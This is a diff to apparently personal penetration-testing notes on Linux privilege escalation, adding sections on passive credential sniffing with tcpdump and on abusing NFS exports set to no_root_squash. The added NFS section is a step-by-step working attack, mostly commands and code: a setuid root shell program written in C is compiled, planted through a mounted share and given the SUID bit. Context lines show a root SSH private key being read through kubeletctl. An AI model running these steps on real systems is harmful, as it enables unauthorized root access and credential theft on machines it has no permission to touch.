@@ -438,7 +438,7 @@ $ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc 
 -----BEGIN OPENSSH PRIVATE KEY-----
 ```
 
-# Logrotate 
+## Logrotate 
 1. we need write permissions on the log files
 ```shell
 # find writable files or directories
@@ -495,3 +495,71 @@ logrotate -f /tmp/pwnme.log
 # edit the log file  to add anything in it
 ```
 
+## Miscellaneous Techniques
+### Passive Traffic Capture
+- If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. 
+- Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. 
+
+### Weak NFS Privileges
+
+in the attacker machine
+```shell
+# lists the NFS server's export list
+showmount -e 10.129.2.12
+```
+in the victim machine 
+```
+cat /etc/exports
+
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/var/nfs/general *(rw,no_root_squash)
+/tmp *(rw,no_root_squash)
+```
+
+| Option         | Description                                                                                                                                                                   |
+|----------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| root_squash    | If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set. |
+| no_root_squash | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|
+
+
+victim machine
+```
+$ cat shell.c 
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+
+
+/tmp$ gcc shell.c -o shell
+```
+
+attacker machine 
+```
+$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
+$ cp shell /mnt
+$ chmod u+s /mnt/shell
+```
+
+victim machine 
+```shell
+/tmp$  ls -la
+
+total 68
+drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
+drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
+-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
+```
